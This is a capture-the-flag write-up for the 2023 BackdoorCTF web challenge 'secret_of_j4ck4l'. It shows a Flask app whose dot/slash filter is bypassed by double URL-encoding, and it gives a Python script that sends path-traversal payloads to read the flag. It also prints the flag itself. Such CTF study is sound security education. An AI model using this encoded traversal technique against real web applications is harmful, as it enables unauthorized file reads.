---
title: 2023 BackdoorCTF - secret_of_j4ck4l
date: 2023-12-18 00:00:00 +0700
categories:
  - Write-ups
tags:
  - 2023_BackdoorCTF
  - Web Exploitation
  - Path traversal
---

## Overview

* 326 solves / 237 points
* Author: j4ck4l

## Description

> I left a message for you. You will love it definitely
> [http://34.132.132.69:8003/](http://34.132.132.69:8003/)

## Attached

[secret_of_j4ck4l.zip](https://github.com/encuetee/CTF-writeups/blob/main/2023/2023_BackdoorCTF/attached/secret_of_j4ck4l.zip)

This is ```app.py``` file
```py
from flask import Flask, request, render_template_string, redirect
import os
import urllib.parse

app = Flask(__name__)

base_directory = "message/"
default_file = "message.txt"

def ignore_it(file_param):
    yoooo = file_param.replace('.', '').replace('/', '')
    if yoooo != file_param:
        return "Illegal characters detected in file parameter!"
    return yoooo

def another_useless_function(file_param):
    return urllib.parse.unquote(file_param)

def url_encode_path(file_param):
    return urllib.parse.quote(file_param, safe='')

def useless (file_param):
    file_param1 = ignore_it(file_param)
    file_param2 = another_useless_function(file_param1)
    file_param3 = ignore_it(file_param2)
    file_param4 = another_useless_function(file_param3)
    file_param5 = another_useless_function(file_param4)
    return file_param5


@app.route('/')
def index():
    return redirect('/read_secret_message?file=message')

@app.route('/read_secret_message')
def read_file(file_param=None):
    file_param = request.args.get('file')
    file_param = useless(file_param)
    print(file_param)
    file_path = os.path.join(base_directory, file_param)

    try:
        with open(file_path, 'r') as file:
            content = file.read()
        return content
    except FileNotFoundError:
        return 'File not found! or maybe illegal characters detected'
    except Exception as e:
        return f'Error: {e}'


if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=4053)

```

## Analyzation

Make a path traversal and we got the flag.

```
http://34.132.132.69:8003/read_secret_message?file={payload}
```

But the payload has to pass the filters

```py
def ignore_it(file_param):
    yoooo = file_param.replace('.', '').replace('/', '')
    if yoooo != file_param:
        return "Illegal characters detected in file parameter!"
    return yoooo

def another_useless_function(file_param):
    return urllib.parse.unquote(file_param)

def url_encode_path(file_param):
    return urllib.parse.quote(file_param, safe='')

def useless (file_param):
    file_param1 = ignore_it(file_param)
    file_param2 = another_useless_function(file_param1)
    file_param3 = ignore_it(file_param2)
    file_param4 = another_useless_function(file_param3)
    file_param5 = another_useless_function(file_param4)
    return file_param5
```

- ```ignore_it(file_param)``` detects dot and slash. But it can be passed by encoding to ```%2e``` and ```%2f```.

- ```another_useless_function(file_param)``` unquote the url. But double encoding works fine: ```%2e``` to ```%252e```.

## Solution

```py
import requests

URL = "http://34.132.132.69:8003/read_secret_message?file={}"

query = "%2e%2e%2fflag%2etxt"
for i in range(3):
    for j in range(i):
        query = query.replace("%", "%25")
        response = requests.get(URL.format(query))
        print(response.text)
```

The flag is
```
flag{s1mp13_l0c4l_f1l3_1nclus10n_0dg4af52gav}
```